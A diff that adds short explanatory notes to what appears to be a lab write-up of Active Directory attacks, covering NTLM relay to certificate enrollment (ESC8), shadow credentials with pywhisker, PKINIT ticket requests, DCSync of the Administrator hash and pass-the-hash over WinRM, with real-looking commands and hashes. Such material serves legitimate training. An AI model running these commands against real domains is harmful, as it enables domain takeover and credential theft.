@@ -36,6 +36,7 @@ impacket-ntlmrelayx \
     -smb2support \
     --template KerberosAuthentication
 ```
+> Starts an NTLM relay targeting the ADCS web enrollment endpoint to request a certificate for any coerced account. Swap `-t` for the target CA URL and `--template` for an enrollable template.
 
 | Flag | Purpose |
 |------|---------|
@@ -85,6 +86,7 @@ python3 gettgtpkinit.py \
     'inlanefreight.local/dc01$' \
     /tmp/dc.ccache
 ```
+> Converts the relayed `.pfx` certificate into a Kerberos TGT (ccache) via PKINIT. Swap the pfx path, DC IP, and `domain/account` for your target; escape `$` in the filename.
 
 ### Step 5 — DCSync with the Machine Account TGT
 
@@ -95,6 +97,7 @@ impacket-secretsdump -k -no-pass \
     -just-dc-user Administrator \
     'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
 ```
+> Performs a DCSync for the Administrator account using the machine-account TGT (`-k -no-pass` reads the ccache from `KRB5CCNAME`). Drop `-just-dc-user` to dump every domain hash.
 
 Result:
 ```
@@ -124,6 +127,7 @@ pywhisker --dc-ip 10.129.234.109 \
     --target jpinkman \
     --action add
 ```
+> Injects an attacker-controlled public key into the target's `msDS-KeyCredentialLink` and writes a `.pfx` + password. Swap `--target` for the victim you have write access over; needs the `AddKeyCredentialLink` edge.
 
 Output:
 ```
@@ -149,6 +153,7 @@ python3 gettgtpkinit.py \
     INLANEFREIGHT.LOCAL/jpinkman \
     /tmp/jpinkman.ccache
 ```
+> Converts the pywhisker-generated `.pfx` into a TGT for the victim via PKINIT. Use the password printed by pywhisker for `-pfx-pass`; swap the domain/user for your target.
 
 ### Step 3 — Use the Ticket
 
@@ -266,6 +271,7 @@ nxc winrm 10.129.234.174 \
     -H 9d995e5865f9dbfc701210466f0c78fe \
     -X "whoami; Get-Content C:\\Users\\jpinkman\\Desktop\\flag.txt"
 ```
+> Full Shadow Credentials chain: verify access, `certipy-ad shadow auto` recovers jpinkman's NT hash, then PtH over WinRM to read the flag. Swap the account and target IP for your lab.
 
 #### Answer
 
@@ -314,6 +320,7 @@ nxc winrm 10.129.234.174 \
     -H fd02e525dd676fd8ca04e200d265f20c \
     -X "Get-Content C:\\Users\\Administrator\\Desktop\\flag.txt"
 ```
+> Full ESC8 chain: relay listener + printerbug coercion yields the DC cert, `certipy-ad auth` recovers DC01$'s NT hash, DCSync dumps Administrator, then PtH over WinRM. Swap target IPs/CA URL for your lab.
 
 #### Answer
 
